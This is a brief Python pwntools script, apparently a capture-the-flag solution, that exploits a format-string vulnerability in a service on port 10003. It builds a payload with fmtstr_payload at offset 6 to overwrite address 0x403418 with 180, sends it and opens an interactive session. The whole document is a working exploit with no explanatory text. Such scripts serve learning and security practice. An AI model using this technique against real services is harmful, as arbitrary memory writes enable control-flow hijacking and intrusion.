from pwn import *

# p = process('./fmt')
p = remote('0.0.0.0' , 10003)
context.update(arch = 'amd64')

targe = 0x403418

payload = fmtstr_payload(6, {targe:180})
p.sendline(payload)

p.interactive()